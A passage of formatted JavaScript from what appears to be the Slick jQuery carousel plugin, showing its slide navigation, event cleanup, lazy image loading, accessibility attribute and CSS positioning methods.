              this.slideCount > this.options.slidesToShow &&
                this.slideHandler(this.currentSlide - o, !1, n);
            break;
          case "next":
            (o = 0 === i ? this.options.slidesToScroll : i),
              this.slideCount > this.options.slidesToShow &&
                this.slideHandler(this.currentSlide + o, !1, n);
            break;
          case "index":
            var a =
              0 === e.data.index
                ? 0
                : e.data.index || r.index() * this.options.slidesToScroll;
            this.slideHandler(this.checkNavigable(a), !1, n),
              r.children().trigger("focus");
            break;
          default:
            return;
        }
      }),
      (n.prototype.checkNavigable = function (t) {
        var e, n;
        if (((e = this.getNavigableIndexes()), (n = 0), t > e[e.length - 1]))
          t = e[e.length - 1];
        else
          for (var i in e) {
            if (t < e[i]) {
              t = n;
              break;
            }
            n = e[i];
          }
        return t;
      }),
      (n.prototype.cleanUpEvents = function () {
        this.options.dots &&
          null !== this.$dots &&
          (t("li", this.$dots)
            .off("click.slick", this.changeSlide)
            .off("mouseenter.slick", t.proxy(this.interrupt, this, !0))
            .off("mouseleave.slick", t.proxy(this.interrupt, this, !1)),
          !0 === this.options.accessibility &&
            this.$dots.off("keydown.slick", this.keyHandler)),
          this.$slider.off("focus.slick blur.slick"),
          !0 === this.options.arrows &&
            this.slideCount > this.options.slidesToShow &&
            (this.$prevArrow &&
              this.$prevArrow.off("click.slick", this.changeSlide),
            this.$nextArrow &&
              this.$nextArrow.off("click.slick", this.changeSlide),
            !0 === this.options.accessibility &&
              (this.$prevArrow &&
                this.$prevArrow.off("keydown.slick", this.keyHandler),
              this.$nextArrow &&
                this.$nextArrow.off("keydown.slick", this.keyHandler))),
          this.$list.off("touchstart.slick mousedown.slick", this.swipeHandler),
          this.$list.off("touchmove.slick mousemove.slick", this.swipeHandler),
          this.$list.off("touchend.slick mouseup.slick", this.swipeHandler),
          this.$list.off(
            "touchcancel.slick mouseleave.slick",
            this.swipeHandler
          ),
          this.$list.off("click.slick", this.clickHandler),
          t(document).off(this.visibilityChange, this.visibility),
          this.cleanUpSlideEvents(),
          !0 === this.options.accessibility &&
            this.$list.off("keydown.slick", this.keyHandler),
          !0 === this.options.focusOnSelect &&
            t(this.$slideTrack)
              .children()
              .off("click.slick", this.selectHandler),
          t(window).off(
            "orientationchange.slick.slick-" + this.instanceUid,
            this.orientationChange
          ),
          t(window).off("resize.slick.slick-" + this.instanceUid, this.resize),
          t("[draggable!=true]", this.$slideTrack).off(
            "dragstart",
            this.preventDefault
          ),
          t(window).off(
            "load.slick.slick-" + this.instanceUid,
            this.setPosition
          );
      }),
      (n.prototype.cleanUpSlideEvents = function () {
        this.$list.off("mouseenter.slick", t.proxy(this.interrupt, this, !0)),
          this.$list.off("mouseleave.slick", t.proxy(this.interrupt, this, !1));
      }),
      (n.prototype.cleanUpRows = function () {
        var t;
        this.options.rows > 1 &&
          ((t = this.$slides.children().children()).removeAttr("style"),
          this.$slider.empty().append(t));
      }),
      (n.prototype.clickHandler = function (t) {
        !1 === this.shouldClick &&
          (t.stopImmediatePropagation(),
          t.stopPropagation(),
          t.preventDefault());
      }),
      (n.prototype.destroy = function (e) {
        var n = this;
        n.autoPlayClear(),
          (n.touchObject = {}),
          n.cleanUpEvents(),
          t(".slick-cloned", n.$slider).detach(),
          n.$dots && n.$dots.remove(),
          n.$prevArrow &&
            n.$prevArrow.length &&
            (n.$prevArrow
              .removeClass("slick-disabled slick-arrow slick-hidden")
              .removeAttr("aria-hidden aria-disabled tabindex")
              .css("display", ""),
            n.htmlExpr.test(n.options.prevArrow) && n.$prevArrow.remove()),
          n.$nextArrow &&
            n.$nextArrow.length &&
            (n.$nextArrow
              .removeClass("slick-disabled slick-arrow slick-hidden")
              .removeAttr("aria-hidden aria-disabled tabindex")
              .css("display", ""),
            n.htmlExpr.test(n.options.nextArrow) && n.$nextArrow.remove()),
          n.$slides &&
            (n.$slides
              .removeClass(
                "slick-slide slick-active slick-center slick-visible slick-current"
              )
              .removeAttr("aria-hidden")
              .removeAttr("data-slick-index")
              .each(function () {
                t(this).attr("style", t(this).data("originalStyling"));
              }),
            n.$slideTrack.children(this.options.slide).detach(),
            n.$slideTrack.detach(),
            n.$list.detach(),
            n.$slider.append(n.$slides)),
          n.cleanUpRows(),
          n.$slider.removeClass("slick-slider"),
          n.$slider.removeClass("slick-initialized"),
          n.$slider.removeClass("slick-dotted"),
          (n.unslicked = !0),
          e || n.$slider.trigger("destroy", [n]);
      }),
      (n.prototype.disableTransition = function (t) {
        var e = this,
          n = {};
        (n[e.transitionType] = ""),
          !1 === e.options.fade ? e.$slideTrack.css(n) : e.$slides.eq(t).css(n);
      }),
      (n.prototype.fadeSlide = function (t, e) {
        var n = this;
        !1 === n.cssTransitions
          ? (n.$slides.eq(t).css({ zIndex: n.options.zIndex }),
            n.$slides
              .eq(t)
              .animate({ opacity: 1 }, n.options.speed, n.options.easing, e))
          : (n.applyTransition(t),
            n.$slides.eq(t).css({ opacity: 1, zIndex: n.options.zIndex }),
            e &&
              setTimeout(function () {
                n.disableTransition(t), e.call();
              }, n.options.speed));
      }),
      (n.prototype.fadeSlideOut = function (t) {
        !1 === this.cssTransitions
          ? this.$slides
              .eq(t)
              .animate(
                { opacity: 0, zIndex: this.options.zIndex - 2 },
                this.options.speed,
                this.options.easing
              )
          : (this.applyTransition(t),
            this.$slides
              .eq(t)
              .css({ opacity: 0, zIndex: this.options.zIndex - 2 }));
      }),
      (n.prototype.filterSlides = n.prototype.slickFilter =
        function (t) {
          var e = this;
          null !== t &&
            ((e.$slidesCache = e.$slides),
            e.unload(),
            e.$slideTrack.children(this.options.slide).detach(),
            e.$slidesCache.filter(t).appendTo(e.$slideTrack),
            e.reinit());
        }),
      (n.prototype.focusHandler = function () {
        var e = this;
        e.$slider
          .off("focus.slick blur.slick")
          .on("focus.slick blur.slick", "*", function (n) {
            n.stopImmediatePropagation();
            var i = t(this);
            setTimeout(function () {
              e.options.pauseOnFocus &&
                ((e.focussed = i.is(":focus")), e.autoPlay());
            }, 0);
          });
      }),
      (n.prototype.getCurrent = n.prototype.slickCurrentSlide =
        function () {
          return this.currentSlide;
        }),
      (n.prototype.getDotCount = function () {
        var t = 0,
          e = 0,
          n = 0;
        if (!0 === this.options.infinite) {
          if (this.slideCount <= this.options.slidesToShow) ++n;
          else
            for (; t < this.slideCount; )
              ++n,
                (t = e + this.options.slidesToScroll),
                (e +=
                  this.options.slidesToScroll <= this.options.slidesToShow
                    ? this.options.slidesToScroll
                    : this.options.slidesToShow);
        } else if (!0 === this.options.centerMode) n = this.slideCount;
        else if (this.options.asNavFor)
          for (; t < this.slideCount; )
            ++n,
              (t = e + this.options.slidesToScroll),
              (e +=
                this.options.slidesToScroll <= this.options.slidesToShow
                  ? this.options.slidesToScroll
                  : this.options.slidesToShow);
        else
          n =
            1 +
            Math.ceil(
              (this.slideCount - this.options.slidesToShow) /
                this.options.slidesToScroll
            );
        return n - 1;
      }),
      (n.prototype.getLeft = function (t) {
        var e,
          n,
          i,
          o,
          s = this,
          r = 0;
        return (
          (s.slideOffset = 0),
          (n = s.$slides.first().outerHeight(!0)),
          !0 === s.options.infinite
            ? (s.slideCount > s.options.slidesToShow &&
                ((s.slideOffset = -(s.slideWidth * s.options.slidesToShow * 1)),
                (o = -1),
                !0 === s.options.vertical &&
                  !0 === s.options.centerMode &&
                  (2 === s.options.slidesToShow
                    ? (o = -1.5)
                    : 1 === s.options.slidesToShow && (o = -2)),
                (r = n * s.options.slidesToShow * o)),
              s.slideCount % s.options.slidesToScroll != 0 &&
                t + s.options.slidesToScroll > s.slideCount &&
                s.slideCount > s.options.slidesToShow &&
                (t > s.slideCount
                  ? ((s.slideOffset = -(
                      (s.options.slidesToShow - (t - s.slideCount)) *
                      s.slideWidth *
                      1
                    )),
                    (r = -(
                      (s.options.slidesToShow - (t - s.slideCount)) *
                      n *
                      1
                    )))
                  : ((s.slideOffset = -(
                      (s.slideCount % s.options.slidesToScroll) *
                      s.slideWidth *
                      1
                    )),
                    (r = -(
                      (s.slideCount % s.options.slidesToScroll) *
                      n *
                      1
                    )))))
            : t + s.options.slidesToShow > s.slideCount &&
              ((s.slideOffset =
                (t + s.options.slidesToShow - s.slideCount) * s.slideWidth),
              (r = (t + s.options.slidesToShow - s.slideCount) * n)),
          s.slideCount <= s.options.slidesToShow &&
            ((s.slideOffset = 0), (r = 0)),
          !0 === s.options.centerMode && s.slideCount <= s.options.slidesToShow
            ? (s.slideOffset =
                (s.slideWidth * Math.floor(s.options.slidesToShow)) / 2 -
                (s.slideWidth * s.slideCount) / 2)
            : !0 === s.options.centerMode && !0 === s.options.infinite
            ? (s.slideOffset +=
                s.slideWidth * Math.floor(s.options.slidesToShow / 2) -
                s.slideWidth)
            : !0 === s.options.centerMode &&
              ((s.slideOffset = 0),
              (s.slideOffset +=
                s.slideWidth * Math.floor(s.options.slidesToShow / 2))),
          (e =
            !1 === s.options.vertical
              ? -(t * s.slideWidth * 1) + s.slideOffset
              : -(t * n * 1) + r),
          !0 === s.options.variableWidth &&
            ((i =
              s.slideCount <= s.options.slidesToShow ||
              !1 === s.options.infinite
                ? s.$slideTrack.children(".slick-slide").eq(t)
                : s.$slideTrack
                    .children(".slick-slide")
                    .eq(t + s.options.slidesToShow)),
            (e =
              !0 === s.options.rtl
                ? i[0]
                  ? -1 * (s.$slideTrack.width() - i[0].offsetLeft - i.width())
                  : 0
                : i[0]
                ? -1 * i[0].offsetLeft
                : 0),
            !0 === s.options.centerMode &&
              ((i =
                s.slideCount <= s.options.slidesToShow ||
                !1 === s.options.infinite
                  ? s.$slideTrack.children(".slick-slide").eq(t)
                  : s.$slideTrack
                      .children(".slick-slide")
                      .eq(t + s.options.slidesToShow + 1)),
              (e =
                !0 === s.options.rtl
                  ? i[0]
                    ? -1 * (s.$slideTrack.width() - i[0].offsetLeft - i.width())
                    : 0
                  : i[0]
                  ? -1 * i[0].offsetLeft
                  : 0),
              (e += (s.$list.width() - i.outerWidth()) / 2))),
          e
        );
      }),
      (n.prototype.getOption = n.prototype.slickGetOption =
        function (t) {
          return this.options[t];
        }),
      (n.prototype.getNavigableIndexes = function () {
        var t,
          e = 0,
          n = 0,
          i = [];
        for (
          !1 === this.options.infinite
            ? (t = this.slideCount)
            : ((e = -1 * this.options.slidesToScroll),
              (n = -1 * this.options.slidesToScroll),
              (t = 2 * this.slideCount));
          e < t;

        )
          i.push(e),
            (e = n + this.options.slidesToScroll),
            (n +=
              this.options.slidesToScroll <= this.options.slidesToShow
                ? this.options.slidesToScroll
                : this.options.slidesToShow);
        return i;
      }),
      (n.prototype.getSlick = function () {
        return this;
      }),
      (n.prototype.getSlideCount = function () {
        var e,
          n,
          i = this;
        return (
          (n =
            !0 === i.options.centerMode
              ? i.slideWidth * Math.floor(i.options.slidesToShow / 2)
              : 0),
          !0 === i.options.swipeToSlide
            ? (i.$slideTrack.find(".slick-slide").each(function (o, s) {
                if (s.offsetLeft - n + t(s).outerWidth() / 2 > -1 * i.swipeLeft)
                  return (e = s), !1;
              }),
              Math.abs(t(e).attr("data-slick-index") - i.currentSlide) || 1)
            : i.options.slidesToScroll
        );
      }),
      (n.prototype.goTo = n.prototype.slickGoTo =
        function (t, e) {
          this.changeSlide(
            { data: { message: "index", index: parseInt(t) } },
            e
          );
        }),
      (n.prototype.init = function (e) {
        var n = this;
        t(n.$slider).hasClass("slick-initialized") ||
          (t(n.$slider).addClass("slick-initialized"),
          n.buildRows(),
          n.buildOut(),
          n.setProps(),
          n.startLoad(),
          n.loadSlider(),
          n.initializeEvents(),
          n.updateArrows(),
          n.updateDots(),
          n.checkResponsive(!0),
          n.focusHandler()),
          e && n.$slider.trigger("init", [n]),
          !0 === n.options.accessibility && n.initADA(),
          n.options.autoplay && ((n.paused = !1), n.autoPlay());
      }),
      (n.prototype.initADA = function () {
        var e = this,
          n = Math.ceil(e.slideCount / e.options.slidesToShow),
          i = e.getNavigableIndexes().filter(function (t) {
            return t >= 0 && t < e.slideCount;
          });
        e.$slides
          .add(e.$slideTrack.find(".slick-cloned"))
          .attr({ "aria-hidden": "true", tabindex: "-1" })
          .find("a, input, button, select")
          .attr({ tabindex: "-1" }),
          null !== e.$dots &&
            (e.$slides
              .not(e.$slideTrack.find(".slick-cloned"))
              .each(function (n) {
                var o = i.indexOf(n);
                t(this).attr({
                  role: "tabpanel",
                  id: "slick-slide" + e.instanceUid + n,
                  tabindex: -1,
                }),
                  -1 !== o &&
                    t(this).attr({
                      "aria-describedby":
                        "slick-slide-control" + e.instanceUid + o,
                    });
              }),
            e.$dots
              .attr("role", "tablist")
              .find("li")
              .each(function (o) {
                var s = i[o];
                t(this).attr({ role: "presentation" }),
                  t(this)
                    .find("button")
                    .first()
                    .attr({
                      role: "tab",
                      id: "slick-slide-control" + e.instanceUid + o,
                      "aria-controls": "slick-slide" + e.instanceUid + s,
                      "aria-label": o + 1 + " of " + n,
                      "aria-selected": null,
                      tabindex: "-1",
                    });
              })
              .eq(e.currentSlide)
              .find("button")
              .attr({ "aria-selected": "true", tabindex: "0" })
              .end());
        for (var o = e.currentSlide, s = o + e.options.slidesToShow; o < s; o++)
          e.$slides.eq(o).attr("tabindex", 0);
        e.activateADA();
      }),
      (n.prototype.initArrowEvents = function () {
        !0 === this.options.arrows &&
          this.slideCount > this.options.slidesToShow &&
          (this.$prevArrow
            .off("click.slick")
            .on("click.slick", { message: "previous" }, this.changeSlide),
          this.$nextArrow
            .off("click.slick")
            .on("click.slick", { message: "next" }, this.changeSlide),
          !0 === this.options.accessibility &&
            (this.$prevArrow.on("keydown.slick", this.keyHandler),
            this.$nextArrow.on("keydown.slick", this.keyHandler)));
      }),
      (n.prototype.initDotEvents = function () {
        !0 === this.options.dots &&
          (t("li", this.$dots).on(
            "click.slick",
            { message: "index" },
            this.changeSlide
          ),
          !0 === this.options.accessibility &&
            this.$dots.on("keydown.slick", this.keyHandler)),
          !0 === this.options.dots &&
            !0 === this.options.pauseOnDotsHover &&
            t("li", this.$dots)
              .on("mouseenter.slick", t.proxy(this.interrupt, this, !0))
              .on("mouseleave.slick", t.proxy(this.interrupt, this, !1));
      }),
      (n.prototype.initSlideEvents = function () {
        this.options.pauseOnHover &&
          (this.$list.on("mouseenter.slick", t.proxy(this.interrupt, this, !0)),
          this.$list.on("mouseleave.slick", t.proxy(this.interrupt, this, !1)));
      }),
      (n.prototype.initializeEvents = function () {
        this.initArrowEvents(),
          this.initDotEvents(),
          this.initSlideEvents(),
          this.$list.on(
            "touchstart.slick mousedown.slick",
            { action: "start" },
            this.swipeHandler
          ),
          this.$list.on(
            "touchmove.slick mousemove.slick",
            { action: "move" },
            this.swipeHandler
          ),
          this.$list.on(
            "touchend.slick mouseup.slick",
            { action: "end" },
            this.swipeHandler
          ),
          this.$list.on(
            "touchcancel.slick mouseleave.slick",
            { action: "end" },
            this.swipeHandler
          ),
          this.$list.on("click.slick", this.clickHandler),
          t(document).on(this.visibilityChange, t.proxy(this.visibility, this)),
          !0 === this.options.accessibility &&
            this.$list.on("keydown.slick", this.keyHandler),
          !0 === this.options.focusOnSelect &&
            t(this.$slideTrack)
              .children()
              .on("click.slick", this.selectHandler),
          t(window).on(
            "orientationchange.slick.slick-" + this.instanceUid,
            t.proxy(this.orientationChange, this)
          ),
          t(window).on(
            "resize.slick.slick-" + this.instanceUid,
            t.proxy(this.resize, this)
          ),
          t("[draggable!=true]", this.$slideTrack).on(
            "dragstart",
            this.preventDefault
          ),
          t(window).on(
            "load.slick.slick-" + this.instanceUid,
            this.setPosition
          ),
          t(this.setPosition);
      }),
      (n.prototype.initUI = function () {
        !0 === this.options.arrows &&
          this.slideCount > this.options.slidesToShow &&
          (this.$prevArrow.show(), this.$nextArrow.show()),
          !0 === this.options.dots &&
            this.slideCount > this.options.slidesToShow &&
            this.$dots.show();
      }),
      (n.prototype.keyHandler = function (t) {
        t.target.tagName.match("TEXTAREA|INPUT|SELECT") ||
          (37 === t.keyCode && !0 === this.options.accessibility
            ? this.changeSlide({
                data: {
                  message: !0 === this.options.rtl ? "next" : "previous",
                },
              })
            : 39 === t.keyCode &&
              !0 === this.options.accessibility &&
              this.changeSlide({
                data: {
                  message: !0 === this.options.rtl ? "previous" : "next",
                },
              }));
      }),
      (n.prototype.lazyLoad = function () {
        function e(e) {
          t("img[data-lazy]", e).each(function () {
            var e = t(this),
              n = t(this).attr("data-lazy"),
              i = t(this).attr("data-srcset"),
              o = t(this).attr("data-sizes") || s.$slider.attr("data-sizes"),
              r = document.createElement("img");
            (r.onload = function () {
              e.animate({ opacity: 0 }, 100, function () {
                i && (e.attr("srcset", i), o && e.attr("sizes", o)),
                  e.attr("src", n).animate({ opacity: 1 }, 200, function () {
                    e.removeAttr(
                      "data-lazy data-srcset data-sizes"
                    ).removeClass("slick-loading");
                  }),
                  s.$slider.trigger("lazyLoaded", [s, e, n]);
              });
            }),
              (r.onerror = function () {
                e
                  .removeAttr("data-lazy")
                  .removeClass("slick-loading")
                  .addClass("slick-lazyload-error"),
                  s.$slider.trigger("lazyLoadError", [s, e, n]);
              }),
              (r.src = n);
          });
        }
        var n,
          i,
          o,
          s = this;
        if (
          (!0 === s.options.centerMode
            ? !0 === s.options.infinite
              ? (o =
                  (i = s.currentSlide + (s.options.slidesToShow / 2 + 1)) +
                  s.options.slidesToShow +
                  2)
              : ((i = Math.max(
                  0,
                  s.currentSlide - (s.options.slidesToShow / 2 + 1)
                )),
                (o = s.options.slidesToShow / 2 + 1 + 2 + s.currentSlide))
            : ((o = Math.ceil(
                (i = s.options.infinite
                  ? s.options.slidesToShow + s.currentSlide
                  : s.currentSlide) + s.options.slidesToShow
              )),
              !0 === s.options.fade &&
                (i > 0 && i--, o <= s.slideCount && o++)),
          (n = s.$slider.find(".slick-slide").slice(i, o)),
          "anticipated" === s.options.lazyLoad)
        )
          for (
            var r = i - 1, a = o, l = s.$slider.find(".slick-slide"), c = 0;
            c < s.options.slidesToScroll;
            c++
          )
            r < 0 && (r = s.slideCount - 1),
              (n = (n = n.add(l.eq(r))).add(l.eq(a))),
              r--,
              a++;
        e(n),
          s.slideCount <= s.options.slidesToShow
            ? e(s.$slider.find(".slick-slide"))
            : s.currentSlide >= s.slideCount - s.options.slidesToShow
            ? e(
                s.$slider.find(".slick-cloned").slice(0, s.options.slidesToShow)
              )
            : 0 === s.currentSlide &&
              e(
                s.$slider
                  .find(".slick-cloned")
                  .slice(-1 * s.options.slidesToShow)
              );
      }),
      (n.prototype.loadSlider = function () {
        this.setPosition(),
          this.$slideTrack.css({ opacity: 1 }),
          this.$slider.removeClass("slick-loading"),
          this.initUI(),
          "progressive" === this.options.lazyLoad && this.progressiveLazyLoad();
      }),
      (n.prototype.next = n.prototype.slickNext =
        function () {
          this.changeSlide({ data: { message: "next" } });
        }),
      (n.prototype.orientationChange = function () {
        this.checkResponsive(), this.setPosition();
      }),
      (n.prototype.pause = n.prototype.slickPause =
        function () {
          var t = this;
          t.autoPlayClear(), (t.paused = !0);
        }),
      (n.prototype.play = n.prototype.slickPlay =
        function () {
          var t = this;
          t.autoPlay(),
            (t.options.autoplay = !0),
            (t.paused = !1),
            (t.focussed = !1),
            (t.interrupted = !1);
        }),
      (n.prototype.postSlide = function (e) {
        var n = this;
        n.unslicked ||
          (n.$slider.trigger("afterChange", [n, e]),
          (n.animating = !1),
          n.slideCount > n.options.slidesToShow && n.setPosition(),
          (n.swipeLeft = null),
          n.options.autoplay && n.autoPlay(),
          !0 === n.options.accessibility &&
            (n.initADA(),
            n.options.focusOnChange &&
              t(n.$slides.get(n.currentSlide)).attr("tabindex", 0).focus()));
      }),
      (n.prototype.prev = n.prototype.slickPrev =
        function () {
          this.changeSlide({ data: { message: "previous" } });
        }),
      (n.prototype.preventDefault = function (t) {
        t.preventDefault();
      }),
      (n.prototype.progressiveLazyLoad = function (e) {
        e = e || 1;
        var n,
          i,
          o,
          s,
          r,
          a = this,
          l = t("img[data-lazy]", a.$slider);
        l.length
          ? ((i = (n = l.first()).attr("data-lazy")),
            (o = n.attr("data-srcset")),
            (s = n.attr("data-sizes") || a.$slider.attr("data-sizes")),
            ((r = document.createElement("img")).onload = function () {
              o && (n.attr("srcset", o), s && n.attr("sizes", s)),
                n
                  .attr("src", i)
                  .removeAttr("data-lazy data-srcset data-sizes")
                  .removeClass("slick-loading"),
                !0 === a.options.adaptiveHeight && a.setPosition(),
                a.$slider.trigger("lazyLoaded", [a, n, i]),
                a.progressiveLazyLoad();
            }),
            (r.onerror = function () {
              e < 3
                ? setTimeout(function () {
                    a.progressiveLazyLoad(e + 1);
                  }, 500)
                : (n
                    .removeAttr("data-lazy")
                    .removeClass("slick-loading")
                    .addClass("slick-lazyload-error"),
                  a.$slider.trigger("lazyLoadError", [a, n, i]),
                  a.progressiveLazyLoad());
            }),
            (r.src = i))
          : a.$slider.trigger("allImagesLoaded", [a]);
      }),
      (n.prototype.refresh = function (e) {
        var n,
          i,
          o = this;
        (i = o.slideCount - o.options.slidesToShow),
          !o.options.infinite && o.currentSlide > i && (o.currentSlide = i),
          o.slideCount <= o.options.slidesToShow && (o.currentSlide = 0),
          (n = o.currentSlide),
          o.destroy(!0),
          t.extend(o, o.initials, { currentSlide: n }),
          o.init(),
          e || o.changeSlide({ data: { message: "index", index: n } }, !1);
      }),
      (n.prototype.registerBreakpoints = function () {
        var e,
          n,
          i,
          o = this,
          s = o.options.responsive || null;
        if ("array" === t.type(s) && s.length) {
          for (e in ((o.respondTo = o.options.respondTo || "window"), s))
            if (((i = o.breakpoints.length - 1), s.hasOwnProperty(e))) {
              for (n = s[e].breakpoint; i >= 0; )
                o.breakpoints[i] &&
                  o.breakpoints[i] === n &&
                  o.breakpoints.splice(i, 1),
                  i--;
              o.breakpoints.push(n), (o.breakpointSettings[n] = s[e].settings);
            }
          o.breakpoints.sort(function (t, e) {
            return o.options.mobileFirst ? t - e : e - t;
          });
        }
      }),
      (n.prototype.reinit = function () {
        var e = this;
        (e.$slides = e.$slideTrack
          .children(e.options.slide)
          .addClass("slick-slide")),
          (e.slideCount = e.$slides.length),
          e.currentSlide >= e.slideCount &&
            0 !== e.currentSlide &&
            (e.currentSlide = e.currentSlide - e.options.slidesToScroll),
          e.slideCount <= e.options.slidesToShow && (e.currentSlide = 0),
          e.registerBreakpoints(),
          e.setProps(),
          e.setupInfinite(),
          e.buildArrows(),
          e.updateArrows(),
          e.initArrowEvents(),
          e.buildDots(),
          e.updateDots(),
          e.initDotEvents(),
          e.cleanUpSlideEvents(),
          e.initSlideEvents(),
          e.checkResponsive(!1, !0),
          !0 === e.options.focusOnSelect &&
            t(e.$slideTrack).children().on("click.slick", e.selectHandler),
          e.setSlideClasses(
            "number" == typeof e.currentSlide ? e.currentSlide : 0
          ),
          e.setPosition(),
          e.focusHandler(),
          (e.paused = !e.options.autoplay),
          e.autoPlay(),
          e.$slider.trigger("reInit", [e]);
      }),
      (n.prototype.resize = function () {
        var e = this;
        t(window).width() !== e.windowWidth &&
          (clearTimeout(e.windowDelay),
          (e.windowDelay = window.setTimeout(function () {
            (e.windowWidth = t(window).width()),
              e.checkResponsive(),
              e.unslicked || e.setPosition();
          }, 50)));
      }),
      (n.prototype.removeSlide = n.prototype.slickRemove =
        function (t, e, n) {
          var i = this;
          if (
            ((t =
              "boolean" == typeof t
                ? !0 === (e = t)
                  ? 0
                  : i.slideCount - 1
                : !0 === e
                ? --t
                : t),
            i.slideCount < 1 || t < 0 || t > i.slideCount - 1)
          )
            return !1;
          i.unload(),
            !0 === n
              ? i.$slideTrack.children().remove()
              : i.$slideTrack.children(this.options.slide).eq(t).remove(),
            (i.$slides = i.$slideTrack.children(this.options.slide)),
            i.$slideTrack.children(this.options.slide).detach(),
            i.$slideTrack.append(i.$slides),
            (i.$slidesCache = i.$slides),
            i.reinit();
        }),
      (n.prototype.setCSS = function (t) {
        var e,
          n,
          i = this,
          o = {};
        !0 === i.options.rtl && (t = -t),
          (e = "left" == i.positionProp ? Math.ceil(t) + "px" : "0px"),
          (n = "top" == i.positionProp ? Math.ceil(t) + "px" : "0px"),
          (o[i.positionProp] = t),
          !1 === i.transformsEnabled
            ? i.$slideTrack.css(o)
            : ((o = {}),
              !1 === i.cssTransitions
                ? ((o[i.animType] = "translate(" + e + ", " + n + ")"),
                  i.$slideTrack.css(o))
                : ((o[i.animType] = "translate3d(" + e + ", " + n + ", 0px)"),
                  i.$slideTrack.css(o)));
      }),
      (n.prototype.setDimensions = function () {
        var t = this;
        !1 === t.options.vertical
          ? !0 === t.options.centerMode &&
            t.$list.css({ padding: "0px " + t.options.centerPadding })
          : (t.$list.height(
              t.$slides.first().outerHeight(!0) * t.options.slidesToShow
            ),
            !0 === t.options.centerMode &&
              t.$list.css({ padding: t.options.centerPadding + " 0px" })),
          (t.listWidth = t.$list.width()),
          (t.listHeight = t.$list.height()),
          !1 === t.options.vertical && !1 === t.options.variableWidth
            ? ((t.slideWidth = Math.ceil(t.listWidth / t.options.slidesToShow)),
              t.$slideTrack.width(
                Math.ceil(
                  t.slideWidth * t.$slideTrack.children(".slick-slide").length
                )
              ))
            : !0 === t.options.variableWidth
            ? t.$slideTrack.width(5e3 * t.slideCount)
            : ((t.slideWidth = Math.ceil(t.listWidth)),
              t.$slideTrack.height(
                Math.ceil(
                  t.$slides.first().outerHeight(!0) *
                    t.$slideTrack.children(".slick-slide").length
                )
              ));
        var e = t.$slides.first().outerWidth(!0) - t.$slides.first().width();
        !1 === t.options.variableWidth &&
          t.$slideTrack.children(".slick-slide").width(t.slideWidth - e);
      }),
      (n.prototype.setFade = function () {
        var e,
          n = this;
        n.$slides.each(function (i, o) {
          (e = -(n.slideWidth * i * 1)),
            !0 === n.options.rtl
              ? t(o).css({
                  position: "relative",
                  right: e,
                  top: 0,
                  zIndex: n.options.zIndex - 2,
                  opacity: 0,
                })
              : t(o).css({
                  position: "relative",
                  left: e,
                  top: 0,
                  zIndex: n.options.zIndex - 2,
                  opacity: 0,
                });
        }),
          n.$slides
            .eq(n.currentSlide)
            .css({ zIndex: n.options.zIndex - 1, opacity: 1 });
      }),
      (n.prototype.setHeight = function () {
        if (
          1 === this.options.slidesToShow &&
          !0 === this.options.adaptiveHeight &&
          !1 === this.options.vertical
        ) {
          var t = this.$slides.eq(this.currentSlide).outerHeight(!0);
          this.$list.css("height", t);
        }
      }),
      (n.prototype.setOption = n.prototype.slickSetOption =
        function () {
          var e,
            n,
            i,
            o,
            s,
            r = this,
            a = !1;
          if (
            ("object" === t.type(arguments[0])
              ? ((i = arguments[0]), (a = arguments[1]), (s = "multiple"))
              : "string" === t.type(arguments[0]) &&
                ((i = arguments[0]),
                (o = arguments[1]),
                (a = arguments[2]),
                "responsive" === arguments[0] &&
                "array" === t.type(arguments[1])
                  ? (s = "responsive")
                  : void 0 !== arguments[1] && (s = "single")),
            "single" === s)
          )
            r.options[i] = o;
          else if ("multiple" === s)
            t.each(i, function (t, e) {
              r.options[t] = e;
            });
          else if ("responsive" === s)
            for (n in o)
              if ("array" !== t.type(r.options.responsive))
                r.options.responsive = [o[n]];
              else {
                for (e = r.options.responsive.length - 1; e >= 0; )
                  r.options.responsive[e].breakpoint === o[n].breakpoint &&
                    r.options.responsive.splice(e, 1),
                    e--;
                r.options.responsive.push(o[n]);
              }
          a && (r.unload(), r.reinit());
        }),
      (n.prototype.setPosition = function () {
        this.setDimensions(),
          this.setHeight(),
          !1 === this.options.fade
            ? this.setCSS(this.getLeft(this.currentSlide))
            : this.setFade(),
          this.$slider.trigger("setPosition", [this]);
      }),
      (n.prototype.setProps = function () {
        var t = this,
          e = document.body.style;
        (t.positionProp = !0 === t.options.vertical ? "top" : "left"),
          "top" === t.positionProp
            ? t.$slider.addClass("slick-vertical")
            : t.$slider.removeClass("slick-vertical"),
          (void 0 === e.WebkitTransition &&
            void 0 === e.MozTransition &&
            void 0 === e.msTransition) ||
            (!0 === t.options.useCSS && (t.cssTransitions = !0)),
          t.options.fade &&
            ("number" == typeof t.options.zIndex
              ? t.options.zIndex < 3 && (t.options.zIndex = 3)
              : (t.options.zIndex = t.defaults.zIndex)),
          void 0 !== e.OTransform &&
            ((t.animType = "OTransform"),
            (t.transformType = "-o-transform"),
            (t.transitionType = "OTransition"),
            void 0 === e.perspectiveProperty &&
              void 0 === e.webkitPerspective &&
              (t.animType = !1)),
          void 0 !== e.MozTransform &&
            ((t.animType = "MozTransform"),
            (t.transformType = "-moz-transform"),
            (t.transitionType = "MozTransition"),
            void 0 === e.perspectiveProperty &&
              void 0 === e.MozPerspective &&
              (t.animType = !1)),
          void 0 !== e.webkitTransform &&
            ((t.animType = "webkitTransform"),
            (t.transformType = "-webkit-transform"),
            (t.transitionType = "webkitTransition"),
            void 0 === e.perspectiveProperty &&
              void 0 === e.webkitPerspective &&
              (t.animType = !1)),
          void 0 !== e.msTransform &&
            ((t.animType = "msTransform"),
            (t.transformType = "-ms-transform"),
            (t.transitionType = "msTransition"),
            void 0 === e.msTransform && (t.animType = !1)),
          void 0 !== e.transform &&
            !1 !== t.animType &&
            ((t.animType = "transform"),
            (t.transformType = "transform"),
            (t.transitionType = "transition")),
          (t.transformsEnabled =
            t.options.useTransform && null !== t.animType && !1 !== t.animType);
      }),
      (n.prototype.setSlideClasses = function (t) {
        var e, n, i, o;
        if (
          ((n = this.$slider
            .find(".slick-slide")
            .removeClass("slick-active slick-center slick-current")
            .attr("aria-hidden", "true")),
          this.$slides.eq(t).addClass("slick-current"),
          !0 === this.options.centerMode)
        ) {
          var s = this.options.slidesToShow % 2 == 0 ? 1 : 0;
          (e = Math.floor(this.options.slidesToShow / 2)),
            !0 === this.options.infinite &&
              (t >= e && t <= this.slideCount - 1 - e
                ? this.$slides
                    .slice(t - e + s, t + e + 1)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false")
